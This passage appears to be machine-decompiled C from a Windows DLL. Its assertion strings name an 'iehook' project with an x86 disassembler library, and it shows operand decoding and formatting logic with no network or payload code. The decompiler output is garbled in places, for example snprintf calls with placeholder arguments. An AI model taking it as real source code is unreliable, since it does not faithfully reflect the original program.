                        // 0x100076d5
                        *(int16_t *)(v79 + 6) = v767;
                        goto lab_0x100076d9;
                    }
                }
            }
        }
    }
  lab_0x1000b0c4:
    // 0x1000b0c4
    *(int32_t *)(v63 - 4) = 3421;
    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
    *(int32_t *)(v63 - 12) = (int32_t)&g3;
    __wassert();
    return 0;
  lab_0x100059ef:
    // 0x100059ef
    *(int16_t *)(v79 + 6) = 32;
    v74 = v69;
    v67 = v63;
    if ((a3 & 2) == 0) {
        goto lab_0x1000af15;
    } else {
        unsigned char v787 = *v18; // 0x10005a02
        int32_t v788 = v787; // 0x10005a02
        int32_t * v789 = (int32_t *)(v63 - 4); // 0x10005a1b
        *v789 = (int32_t)"<EDX:ECX:EBX:EAX>";
        int32_t * v790 = (int32_t *)(v63 - 8); // 0x10005a20
        *v790 = v787 == -1 ? 0 : 256 - v788;
        int32_t * v791 = (int32_t *)(v63 - 12); // 0x10005a28
        *v791 = v19 + v788;
        int32_t v792 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10005a29
        unsigned char v793 = *v18 + (char)v792; // 0x10005a2e
        *v18 = v793;
        v74 = v69;
        v67 = v63;
        if ((a3 & 16) == 0) {
            goto lab_0x1000af15;
        } else {
            // 0x10005a47
            *(char *)(v19 + (int32_t)v793) = 123;
            *v18 = *v18 + 1;
            int32_t * v794 = (int32_t *)v79; // 0x10005a55
            int32_t v795 = *v794; // 0x10005a55
            int32_t v796 = v795; // 0x10005a5b
            if ((v795 & 0xe000) == 0) {
                // 0x10005a5d
                *v789 = 2954;
                *v790 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *v791 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                __wassert();
                v796 = *v794;
            }
            int32_t v797 = v796; // 0x10005a7a
            if ((v796 & 0x200000) != 0) {
                // 0x10005a7c
                *(char *)(v19 + (int32_t)*v18) = 114;
                *v18 = *v18 + 1;
                v797 = *v794;
            }
            int32_t v798 = v797; // 0x10005a94
            if ((v797 & 0x100000) != 0) {
                // 0x10005a96
                *(char *)(v19 + (int32_t)*v18) = 102;
                *v18 = *v18 + 1;
                v798 = *v794;
            }
            int32_t v799 = v798; // 0x10005aae
            if ((v798 & 1024) != 0) {
                // 0x10005ab0
                *(char *)(v19 + (int32_t)*v18) = 99;
                *v18 = *v18 + 1;
                v799 = *v794;
            }
            // 0x10005ac2
            v72 = v69;
            v61 = v799;
            v65 = v63;
            if ((int16_t)v799 > -1) {
                goto lab_0x1000ae34;
            } else {
                // 0x10005acf
                *(char *)(v19 + (int32_t)*v18) = 88;
                v73 = v69;
                v66 = v63;
                goto lab_0x1000ae47;
            }
        }
    }
  lab_0x1000af15:;
    uint32_t v800 = v78 + 1; // 0x1000af18
    v54 = v74;
    v55 = v800;
    v57 = v67;
    int32_t result2 = v74; // 0x1000af22
    if (v800 >= *v15) {
        // 0x1000af28
        return result2;
    }
    goto lab_0x10003565;
  lab_0x100076d9:;
    uint32_t v801 = v80 & 0xff0000; // 0x100035a9
    int32_t * v802; // 0x10003490
    int32_t * v803; // 0x10003490
    int16_t * v804; // 0x10003490
    int16_t * v805; // 0x10003490
    int32_t * v806; // 0x10003490
    char v807; // 0x10003490
    int32_t v808; // 0x10003490
    int32_t v809; // 0x10003490
    int32_t v810; // 0x10003490
    int32_t v811; // 0x10003490
    int32_t v812; // 0x10003490
    int32_t v813; // 0x10003490
    int32_t v814; // 0x10003490
    int32_t v815; // 0x10003490
    int32_t v816; // 0x10003490
    int32_t v817; // 0x10003490
    int32_t v818; // 0x10003490
    int32_t v819; // 0x10003490
    int32_t v820; // 0x10003490
    int32_t v821; // 0x10003490
    int16_t * v822; // 0x10003490
    int32_t * v823; // 0x10003490
    int32_t * v824; // 0x10003490
    int32_t v825; // 0x10003490
    int32_t * v826; // 0x100080ef
    int16_t * v827; // 0x100080f5
    int32_t * v828; // 0x10008a4c
    int16_t * v829; // 0x10003490
    unsigned char v830; // 0x10007d48
    int32_t v831; // 0x10007dfc
    int32_t v832; // 0x10007e1d
    if (v801 < 0xb0001) {
        if (v801 == 0xb0000) {
            // 0x1000984d
            if ((*v2 & 8) == 0) {
                // 0x10009856
                *(int32_t *)(v63 - 4) = 4026;
                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->HasModRM";
                __wassert();
            }
            if ((v6 & 3) != 3) {
                goto lab_0x1000898c;
            } else {
                if (v40 >= 113) {
                    // 0x1000b2bb
                    result2 = 0;
                    if (v16 != 0) {
                        goto lab_0x1000af28;
                    } else {
                        // 0x1000b2c5
                        *(int32_t *)(v63 - 4) = v1 + 696;
                        uint32_t v833 = *v21; // 0x1000b2d0
                        int32_t v834 = *v23; // 0x1000b2da
                        uint32_t v835 = v834 + v833; // 0x1000b2da
                        *(int32_t *)(v63 - 8) = (int32_t)v38;
                        int32_t v836 = *v24; // 0x1000b2e1
                        *(int32_t *)(v63 - 12) = v836 + v833 / 0x80000000 + (int32_t)(v835 < v833);
                        *(int32_t *)(v63 - 16) = v835;
                        int32_t v837 = v63 - 20; // 0x1000b2e9
                        *(int32_t *)v837 = (int32_t)"[0x%08I64X] ERROR: invalid mmx register %d for AMODE_P (\"%s\")\n";
                        v816 = v837;
                        goto lab_0x1000b503;
                    }
                }
                // 0x10009890
                *(int32_t *)(v79 + 16) = v41;
                int32_t * v838 = (int32_t *)v79;
                int32_t v839 = *v838; // 0x1000989c
                *v838 = v839 | 128;
                v806 = v838;
                v814 = v63;
                if ((v839 & 0x4000) == 0) {
                    goto lab_0x100098f8;
                } else {
                    // 0x100098aa
                    *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                    char v840 = *v29; // 0x100098be
                    *v29 = v840 + 16 & 48 | v840 & -49;
                    v806 = v838;
                    v814 = v63;
                    if (v75 < 2) {
                        goto lab_0x100098f8;
                    } else {
                        int32_t v841 = v63 - 4; // 0x100098de
                        *(int32_t *)v841 = 4037;
                        v802 = v838;
                        v821 = v841;
                        goto lab_0x100098e3;
                    }
                }
            }
        } else {
            if (v801 < 0x60001) {
                if (v801 == 0x60000) {
                    if ((a3 & 4) == 0) {
                        // 0x100083ac
                        v804 = (int16_t *)(v79 + 6);
                        goto lab_0x100084f7;
                    } else {
                        char * v842 = (char *)(v79 + 4); // 0x100083b6
                        *v842 = *v842 & -64 | 1;
                        v822 = (int16_t *)(v79 + 6);
                        uint16_t v843 = *v822; // 0x100083c0
                        g157 = (int32_t)v843 - 1;
                        switch (v843) {
                            case 1: {
                                unsigned char v844 = *(char *)v69;
                                if ((v80 & 256) == 0) {
                                    // 0x100084ea
                                    v810 = v844;
                                } else {
                                    // 0x100084e2
                                    v810 = v844;
                                }
                                goto lab_0x100084f0;
                            }
                            case 2: {
                                uint16_t v845 = *(int16_t *)v69;
                                if ((v80 & 256) == 0) {
                                    // 0x100084d1
                                    v810 = v845;
                                } else {
                                    // 0x100084c9
                                    v810 = v845;
                                }
                                goto lab_0x100084f0;
                            }
                            case 4: {
                                if (v75 == 1 == (v80 & 256) == 0) {
                                    // 0x100083fd
                                    if ((*(int32_t *)v17 & 0x10080) == 0) {
                                        // 0x100084a4
                                        v825 = *(int32_t *)v69;
                                        goto lab_0x100084af;
                                    } else {
                                        // 0x1000840d
                                        if (*v20 != 8) {
                                            // 0x100084a4
                                            v825 = *(int32_t *)v69;
                                            goto lab_0x100084af;
                                        } else {
                                            // 0x1000841b
                                            if ((*v26 & 15) != 8) {
                                                // 0x10008427
                                                *(int32_t *)(v63 - 4) = 3480;
                                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                                *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->OperandSize == 8";
                                                __wassert();
                                            }
                                            int32_t v846 = *v34; // 0x1000843e
                                            if (v846 > 0x1002) {
                                                if (v846 == 0x2001) {
                                                    // 0x1000846e
                                                    v810 = *(int32_t *)v69;
                                                    goto lab_0x100084f0;
                                                } else {
                                                    goto lab_0x1000847c;
                                                }
                                            } else {
                                                if (v846 > 0x1000) {
                                                    // 0x1000846e
                                                    v810 = *(int32_t *)v69;
                                                    goto lab_0x100084f0;
                                                } else {
                                                    if (v846 > 1027) {
                                                        goto lab_0x1000847c;
                                                    } else {
                                                        if (v846 < 1025 == v846 > 515) {
                                                            goto lab_0x1000847c;
                                                        } else {
                                                            // 0x1000846e
                                                            v810 = *(int32_t *)v69;
                                                            goto lab_0x100084f0;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                } else {
                                    int32_t v847 = *(int32_t *)v69;
                                    v825 = v847;
                                    v810 = v847;
                                    if ((v80 & 256) == 0) {
                                        goto lab_0x100084af;
                                    } else {
                                        goto lab_0x100084f0;
                                    }
                                }
                            }
                            case 8: {
                                // 0x100083d5
                                *(int32_t *)(v79 + 32) = *(int32_t *)v69;
                                v812 = *(int32_t *)(v69 + 4);
                                goto lab_0x100084f4;
                            }
                            default: {
                                // 0x1000b197
                                *(int32_t *)(v63 - 4) = 3517;
                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                __wassert();
                                return 0;
                            }
                        }
                    }
                } else {
                    if (v801 < 0x30001) {
                        switch (v801) {
                            case 0x30000: {
                                // 0x10007e7f
                                if ((*v2 & 8) == 0) {
                                    // 0x10007e88
                                    *(int32_t *)(v63 - 4) = 3961;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->HasModRM";
                                    __wassert();
                                }
                                // 0x10007ea2
                                if (*v34 != 0x2001) {
                                    // 0x10007eae
                                    *(int32_t *)(v63 - 4) = 3962;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)L"Instruction->Type == ITYPE_MOV";
                                    __wassert();
                                }
                                // 0x10007ec8
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 4) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10007ed2
                                    *v25 = *v25 | 2;
                                    int32_t * v848 = (int32_t *)v79; // 0x10007ed9
                                    *v848 = *v848 | 128;
                                    *v33 = *v33 | 0x80000;
                                    *v25 = *v25 | 2;
                                    char v849 = *v26;
                                    char v850 = v849; // 0x10007ef7
                                    if (*(int32_t *)(*v27 + 4) == 3) {
                                        // 0x10007ef9
                                        v850 = v849 & -16 | 8;
                                        *v26 = v850;
                                    }
                                    unsigned char v851 = v850 & 15;
                                    if (v851 != 2) {
                                        int32_t v852 = (int32_t)v851 - 4; // 0x10007f1a
                                        if (v852 != 0 == (v852 != 4)) {
                                            // 0x1000b121
                                            *(int32_t *)(v63 - 4) = 3977;
                                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                            *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                            __wassert();
                                            return 0;
                                        }
                                    }
                                    int32_t * v853 = (int32_t *)(v79 + 16); // 0x10007f32
                                    *v853 = (int32_t)(v42 | 48);
                                    if ((*v848 & 0x4000) != 0) {
                                        // 0x10007f3d
                                        *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                        char v854 = *v29; // 0x10007f51
                                        *v29 = v854 + 16 & 48 | v854 & -49;
                                        if (v75 >= 2) {
                                            // 0x10007f71
                                            *(int32_t *)(v63 - 4) = 3981;
                                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                            *(int32_t *)(v63 - 12) = (int32_t)L"OperandIndex < 2";
                                            __wassert();
                                        }
                                    }
                                    // 0x10007f8b
                                    if ((*v848 & 0x2000) != 0) {
                                        // 0x10007f93
                                        *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                                        *v29 = *v29 + 64;
                                    }
                                    // 0x10007fbc
                                    v74 = v69;
                                    v67 = v63;
                                    if ((a3 & 2) == 0) {
                                        goto lab_0x1000af15;
                                    } else {
                                        unsigned char v855 = *v18; // 0x10007fc6
                                        int32_t v856 = v855; // 0x10007fc6
                                        int32_t * v857 = (int32_t *)(v63 - 4); // 0x10007fe9
                                        *v857 = *(int32_t *)(4 * *v853 + (int32_t)&g68);
                                        int32_t * v858 = (int32_t *)(v63 - 8); // 0x10007fea
                                        *v858 = v855 == -1 ? 0 : 256 - v856;
                                        int32_t * v859 = (int32_t *)(v63 - 12); // 0x10007ff2
                                        *v859 = v19 + v856;
                                        int32_t v860 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10007ff3
                                        unsigned char v861 = *v18 + (char)v860; // 0x10007ff8
                                        *v18 = v861;
                                        v74 = v69;
                                        v67 = v63;
                                        if ((a3 & 16) == 0) {
                                            goto lab_0x1000af15;
                                        } else {
                                            // 0x10008011
                                            *(char *)(v19 + (int32_t)v861) = 123;
                                            *v18 = *v18 + 1;
                                            int32_t v862 = *v848; // 0x1000801f
                                            int32_t v863 = v862; // 0x10008025
                                            if ((v862 & 0xe000) == 0) {
                                                // 0x10008027
                                                *v857 = 3985;
                                                *v858 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                                *v859 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                                __wassert();
                                                v863 = *v848;
                                            }
                                            int32_t v864 = v863; // 0x10008044
                                            if ((v863 & 0x200000) != 0) {
                                                // 0x10008046
                                                *(char *)(v19 + (int32_t)*v18) = 114;
                                                *v18 = *v18 + 1;
                                                v864 = *v848;
                                            }
                                            int32_t v865 = v864; // 0x1000805e
                                            if ((v864 & 0x100000) != 0) {
                                                // 0x10008060
                                                *(char *)(v19 + (int32_t)*v18) = 102;
                                                *v18 = *v18 + 1;
                                                v865 = *v848;
                                            }
                                            int32_t v866 = v865; // 0x10008078
                                            if ((v865 & 1024) != 0) {
                                                // 0x1000807a
                                                *(char *)(v19 + (int32_t)*v18) = 99;
                                                *v18 = *v18 + 1;
                                                v866 = *v848;
                                            }
                                            // 0x1000808c
                                            v72 = v69;
                                            v61 = v866;
                                            v65 = v63;
                                            if ((int16_t)v866 > -1) {
                                                goto lab_0x1000ae34;
                                            } else {
                                                // 0x10008099
                                                *(char *)(v19 + (int32_t)*v18) = 88;
                                                v73 = v69;
                                                v66 = v63;
                                                goto lab_0x1000ae47;
                                            }
                                        }
                                    }
                                }
                            }
                            case 0x10000: {
                                // 0x10007949
                                v824 = (int32_t *)v79;
                                *v824 = *v824 | 0x110000;
                                char v867 = *v25; // 0x1000794f
                                if ((v867 & 16) == 0) {
                                    // 0x10007958
                                    if ((*v28 & 4) != 0) {
                                        char v868 = v867; // 0x10007965
                                        if (v16 == 0) {
                                            uint32_t v869 = *v21; // 0x10007967
                                            uint32_t v870 = *v23 + v869; // 0x1000796e
                                            *(int32_t *)(v63 - 4) = *v24 + v869 / 0x80000000 + (int32_t)(v870 < v869);
                                            *(int32_t *)(v63 - 8) = v870;
                                            *(int32_t *)(v63 - 12) = (int32_t)"[0x%08I64X] ANOMALY: Unexpected address size prefix\n";
                                            _printf((char *)&g173);
                                            v868 = *v25;
                                        }
                                        // 0x10007989
                                        *v25 = v868 | 16;
                                    }
                                }
                                // 0x10007990
                                *v28 = *v28 & -5;
                                int32_t v871 = *(int32_t *)(*v27 + 4); // 0x1000799a
                                if (v871 == 1) {
                                    // 0x100079cc
                                    *v26 = *v26 & 15 | 64;
                                } else {
                                    int32_t v872 = v871 - 2; // 0x100079a0
                                    if (v872 == 0) {
                                        // 0x100079ba
                                        *v26 = *v26 & 15 | 32;
                                    } else {
                                        if (v872 == 1) {
                                            // 0x100079a6
                                            *v26 = *v26 & 15 | -128;
                                        }
                                    }
                                }
                                char v873 = *v25; // 0x100079de
                                if ((v873 & 16) == 0) {
                                    // 0x100079e7
                                    if ((*v28 & 8) != 0) {
                                        char v874 = v873; // 0x100079f4
                                        if (v16 == 0) {
                                            uint32_t v875 = *v21; // 0x100079f6
                                            uint32_t v876 = *v23 + v875; // 0x100079fd
                                            *(int32_t *)(v63 - 4) = *v24 + v875 / 0x80000000 + (int32_t)(v876 < v875);
                                            *(int32_t *)(v63 - 8) = v876;
                                            *(int32_t *)(v63 - 12) = (int32_t)"[0x%08I64X] ANOMALY: Unexpected segment override\n";
                                            _printf((char *)&g173);
                                            v874 = *v25;
                                        }
                                        // 0x10007a18
                                        *v25 = v874 | 16;
                                    }
                                }
                                // 0x10007a1f
                                *v47 = *v47 | 2;
                                *v28 = *v28 & -9;
                                int16_t * v877 = (int16_t *)(v79 + 6); // 0x10007a2d
                                int32_t v878 = (int32_t)*v877 - 4; // 0x10007a31
                                int32_t v879; // 0x10003490
                                if (v878 == 0) {
                                    // 0x10007a6e
                                    *v37 = (int32_t)*(int16_t *)v69;
                                    *v48 = *v48 + 2;
                                    int32_t v880 = (int32_t)*(int16_t *)(v69 + 2); // 0x10007a85
                                    *v45 = v880;
                                    *v46 = v880 >> 31;
                                    *v48 = *v48 + 2;
                                    v879 = v69 + 4;
                                } else {
                                    if (v878 != 2) {
                                        // 0x1000b102
                                        *(int32_t *)(v63 - 4) = 3641;
                                        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                        __wassert();
                                        return 0;
                                    }
                                    // 0x10007a3f
                                    *v37 = (int32_t)*(int16_t *)v69;
                                    *v48 = *v48 + 2;
                                    int32_t v881 = *(int32_t *)(v69 + 2); // 0x10007a52
                                    *v45 = v881;
                                    *v46 = v881 >> 31;
                                    *v48 = *v48 + 4;
                                    v879 = v69 + 6;
                                }
                                // 0x10007aa0
                                v820 = v879;
                                v74 = v820;
                                v67 = v63;
                                if ((a3 & 4) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    char v882 = *v2; // 0x10007aad
                                    char v883 = v882 | 64; // 0x10007aad
                                    *v2 = v883;
                                    int32_t v884 = *v824; // 0x10007ab4
                                    int32_t v885 = v884; // 0x10007ac0
                                    if ((v884 & 0x4000) != 0) {
                                        char v886 = v883; // 0x10007ac4
                                        if ((v882 & 2) != 0) {
                                            // 0x10007ac6
                                            *(int32_t *)(v63 - 4) = 3646;
                                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                            *(int32_t *)(v63 - 12) = (int32_t)L"!X86Instruction->HasDstAddressing";
                                            __wassert();
                                            v886 = *v2;
                                        }
                                        // 0x10007add
                                        *v2 = v886 | 2;
                                        *(char *)(v30 + (int32_t)(*v29 / 16 & 3)) = v75;
                                        char v887 = *v29; // 0x10007afb
                                        *v29 = v887 & -52 | v75 & 3 | v887 + 16 & 48;
                                        v885 = *v824;
                                    }
                                    // 0x10007b21
                                    if ((v885 & 0x2000) != 0) {
                                        // 0x10007b29
                                        if (*v34 != 0x4001) {
                                            // 0x10007b35
                                            if ((*v2 & 4) != 0) {
                                                // 0x10007b3e
                                                *(int32_t *)(v63 - 4) = 3646;
                                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                                *(int32_t *)(v63 - 12) = (int32_t)L"!X86Instruction->HasSrcAddressing";
                                                __wassert();
                                            }
                                        }
                                        // 0x10007b55
                                        *v2 = *v2 | 4;
                                        *(char *)(((int32_t)(*v29 / 64) | 756) + v1) = v75;
                                        char v888 = *v29; // 0x10007b6d
                                        *v29 = v888 & 51 | 4 * v75 & 12 | v888 + 64 & -64;
                                    }
                                    // 0x10007b91
                                    if ((*v47 & 2) == 0) {
                                        int32_t v889 = *v37; // 0x10007bdf
                                        g155 = v889;
                                        switch (v889) {
                                            case 0: {
                                            }
                                            case 1: {
                                            }
                                            case 2: {
                                            }
                                            case 3: {
                                                // 0x10007bf1
                                                *(int32_t *)(v79 + 8) = *v45;
                                                *(int32_t *)(v79 + 12) = *v46;
                                                // break -> 0x10007c3c
                                                break;
                                            }
                                            case 4: {
                                            }
                                            case 5: {
                                                // 0x10007c05
                                                *(int32_t *)(v63 - 4) = *v45;
                                                *(int32_t *)(v63 - 8) = (int32_t)*v50;
                                                int32_t v890 = function_10001000((int32_t)&g173, (int32_t)&g173); // 0x10007c14
                                                *(int32_t *)(v79 + 8) = v890;
                                                *(int32_t *)(v79 + 12) = v890 >> 31;
                                                // break -> 0x10007c3c
                                                break;
                                            }
                                            default: {
                                                // 0x10007c25
                                                *(int32_t *)(v63 - 4) = 3647;
                                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                                *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                                __wassert();
                                                // break -> 0x10007c3c
                                                break;
                                            }
                                        }
                                    } else {
                                        char v891 = *v25; // 0x10007b9a
                                        if ((v891 & 16) == 0) {
                                            char v892 = v891; // 0x10007bab
                                            if (v16 == 0) {
                                                // 0x10007bad
                                                *(int32_t *)(v63 - 4) = *v37;
                                                uint32_t v893 = *v21; // 0x10007bb4
                                                uint32_t v894 = *v23 + v893; // 0x10007bbb
                                                *(int32_t *)(v63 - 8) = *v24 + v893 / 0x80000000 + (int32_t)(v894 < v893);
                                                *(int32_t *)(v63 - 12) = v894;
                                                *(int32_t *)(v63 - 16) = (int32_t)"[0x%08I64X] ANOMALY: unexpected segment 0x%02X\n";
                                                _printf((char *)&g173);
                                                v892 = *v25;
                                            }
                                            // 0x10007bd6
                                            *v25 = v892 | 16;
                                        }
                                    }
                                    // 0x10007c3c
                                    v74 = v820;
                                    v67 = v63;
                                    if ((a3 & 2) == 0) {
                                        goto lab_0x1000af15;
                                    } else {
                                        // 0x10007c46
                                        if (*v877 >= 9) {
                                            // 0x10007c4d
                                            *(int32_t *)(v63 - 4) = 3651;
                                            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                            *(int32_t *)(v63 - 12) = (int32_t)L"(Operand)->Length <= 8";
                                            __wassert();
                                        }
                                        int32_t v895 = *v824;
                                        int32_t v896; // 0x10003490
                                        int32_t v897; // 0x10003490
                                        int32_t v898; // 0x10003490
                                        if ((*v47 & 2) == 0) {
                                            int32_t * v899 = (int32_t *)(v63 - 4);
                                            if ((v895 & 0x100000) != 0) {
                                                // 0x10007cc9
                                                *v899 = 3651;
                                                *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                                *(int32_t *)(v63 - 12) = (int32_t)L"!((Operand)->Flags & OP_FAR)";
                                                __wassert();
                                            }
                                            int32_t v900 = *v37; // 0x10007ce0
                                            int32_t * v901; // 0x10003490
                                            int32_t v902; // 0x10003490
                                            int32_t * v903; // 0x10003490
                                            int32_t v904; // 0x10003490
                                            if (v900 < 6) {
                                                int32_t v905 = v63 - 12; // 0x10007d35
                                                v903 = (int32_t *)v905;
                                                v902 = v905;
                                                v901 = (int32_t *)(v63 - 8);
                                                v904 = v900;
                                            } else {
                                                // 0x10007ce9
                                                *v899 = 3651;
                                                int32_t * v906 = (int32_t *)(v63 - 8);
                                                *v906 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                                int32_t v907 = v63 - 12;
                                                int32_t * v908 = (int32_t *)v907;
                                                *v908 = (int32_t)L"X86Instruction->Segment < SEG_MAX";
                                                __wassert();
                                                v903 = v908;
                                                v902 = v907;
                                                v901 = v906;
                                                v904 = *v37;
                                            }
                                            unsigned char v909 = *v18; // 0x10007d00
                                            int32_t v910 = v909; // 0x10007d00
                                            *v899 = *(int32_t *)(4 * v904 + (int32_t)&g46);
                                            uint16_t v911 = *v877; // 0x10007d27
                                            int32_t v912 = *(int32_t *)(4 * (int32_t)(v911 / 2) + (int32_t)&g47); // 0x10007d2d
                                            *v901 = v912;
                                            *v903 = (int32_t)"%s %s:[";
                                            v896 = v909 == -1 ? 0 : 256 - v910;
                                            v897 = v910;
                                            v898 = v902;
                                        } else {
                                            int32_t * v913 = (int32_t *)(v63 - 4);
                                            int32_t * v914; // 0x10003490
                                            int32_t v915; // 0x10003490
                                            int32_t * v916; // 0x10003490
                                            if ((v895 & 0x100000) != 0) {
                                                int32_t v917 = v63 - 12; // 0x10007cba
                                                v916 = (int32_t *)v917;
                                                v915 = v917;
                                                v914 = (int32_t *)(v63 - 8);
                                            } else {
                                                // 0x10007c75
                                                *v913 = 3651;
                                                int32_t * v918 = (int32_t *)(v63 - 8);
                                                *v918 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                                int32_t v919 = v63 - 12;
                                                int32_t * v920 = (int32_t *)v919;
                                                *v920 = (int32_t)L"(Operand)->Flags & OP_FAR";
                                                __wassert();
                                                v916 = v920;
                                                v915 = v919;
                                                v914 = v918;
                                            }
                                            unsigned char v921 = *v18; // 0x10007c8c
                                            int32_t v922 = v921; // 0x10007c8c
                                            *v913 = *v37;
                                            uint16_t v923 = *v877; // 0x10007cac
                                            int32_t v924 = *(int32_t *)(4 * (int32_t)(v923 / 2) + (int32_t)&g47); // 0x10007cb2
                                            *v914 = v924;
                                            *v916 = (int32_t)"%s 0x%02X:[";
                                            v896 = v921 == -1 ? 0 : 256 - v922;
                                            v897 = v922;
                                            v898 = v915;
                                        }
                                        int32_t v925 = v898;
                                        int32_t * v926 = (int32_t *)(v925 - 4); // 0x10007d3a
                                        *v926 = v896;
                                        int32_t * v927 = (int32_t *)(v925 - 8); // 0x10007d42
                                        *v927 = v897 + v19;
                                        int32_t v928 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10007d43
                                        v830 = *v18 + (char)v928;
                                        *v18 = v830;
                                        unsigned char v929 = *v26; // 0x10007d4e
                                        if ((v929 & -16) == 32) {
                                            // 0x10007dfc
                                            v831 = v830;
                                            *(int32_t *)(v925 + 8) = (int32_t)*v49;
                                            v832 = v925 + 4;
                                            *(int32_t *)v832 = (int32_t)"0x%04X";
                                            goto lab_0x10007e22;
                                        } else {
                                            int32_t v930 = v925 + 12; // 0x10007d58
                                            switch ((int32_t)(v929 / 16)) {
                                                case 4: {
                                                    // 0x10007dc9
                                                    if (v830 == -1) {
                                                        int32_t v931 = *v45; // 0x10007dec
                                                        *(int32_t *)(v925 + 8) = v931;
                                                        int32_t v932 = v925 + 4; // 0x10007df5
                                                        *(int32_t *)v932 = (int32_t)"0x%04lX";
                                                    } else {
                                                        int32_t v933 = *v45; // 0x10007dde
                                                        *(int32_t *)(v925 + 8) = v933;
                                                        int32_t v934 = v925 + 4; // 0x10007de5
                                                        *(int32_t *)v934 = (int32_t)"0x%04lX";
                                                    }
                                                    goto lab_0x10007e22;
                                                }
                                                case 8: {
                                                    int32_t v935 = v830; // 0x10007d8a
                                                    *(int32_t *)(v925 + 8) = *v46;
                                                    *(int32_t *)(v925 + 4) = *v45;
                                                    *(int32_t *)v925 = (int32_t)"0x%04I64X";
                                                    *v926 = v830 == -1 ? 0 : 256 - v935;
                                                    *v927 = v19 + v935;
                                                    v808 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173);
                                                    v819 = v930;
                                                    goto lab_0x10007e33;
                                                }
                                                default: {
                                                    // 0x10007d6e
                                                    *(int32_t *)(v925 + 8) = 3651;
                                                    *(int32_t *)(v925 + 4) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                                    *(int32_t *)v925 = (int32_t)&g3;
                                                    __wassert();
                                                    v807 = *v18;
                                                    v817 = v930;
                                                    goto lab_0x10007e39;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            default: {
                                if (v801 != 0x20000) {
                                    // 0x1000b524
                                    *(int32_t *)(v63 - 4) = 4063;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                    __wassert();
                                    return 0;
                                }
                                // 0x10007727
                                if ((*v2 & 8) == 0) {
                                    // 0x10007730
                                    *(int32_t *)(v63 - 4) = 3932;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)L"X86Instruction->HasModRM";
                                    __wassert();
                                }
                                // 0x1000774a
                                if (*v34 != 0x2001) {
                                    // 0x10007756
                                    *(int32_t *)(v63 - 4) = 3933;
                                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *(int32_t *)(v63 - 12) = (int32_t)L"Instruction->Type == ITYPE_MOV";
                                    __wassert();
                                }
                                // 0x10007770
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 4) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x1000777a
                                    *v33 = *v33 | 0x80000;
                                    *v25 = *v25 | 2;
                                    int32_t * v936 = (int32_t *)v79; // 0x1000778b
                                    *v936 = *v936 | 128;
                                    char v937 = *v26;
                                    char v938 = v937; // 0x10007798
                                    if (*(int32_t *)(*v27 + 4) == 3) {
                                        // 0x1000779a
                                        v938 = v937 & -16 | 8;
                                        *v26 = v938;
                                    }
                                    unsigned char v939 = v938 & 15;
